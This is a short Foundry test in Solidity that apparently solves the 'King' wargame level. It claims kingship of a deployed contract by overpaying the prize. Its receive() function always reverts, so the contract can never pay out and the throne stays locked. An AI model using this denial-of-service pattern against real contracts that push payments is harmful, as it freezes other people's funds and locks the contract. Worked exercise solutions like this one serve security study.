// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

contract KingTest is Test {
    King public king = King(payable(0xf0389259AEcc055d507BAdA64DF1B7aFFAAe4208));

    function testAttack() public {
        uint256 prevPrize = king.prize();
        uint256 newPrize = prevPrize + 1;

        console.log(king._king());

        address(king).call{value: newPrize, gas: 30000}("");
        address(king).call{value: newPrize + 1, gas: 30000}("");

        console.log(king._king());

        assertEq(king._king(), address(this));
    }

    receive() external payable {
        revert("Get out here, man, shit I'm saying");
    }
}
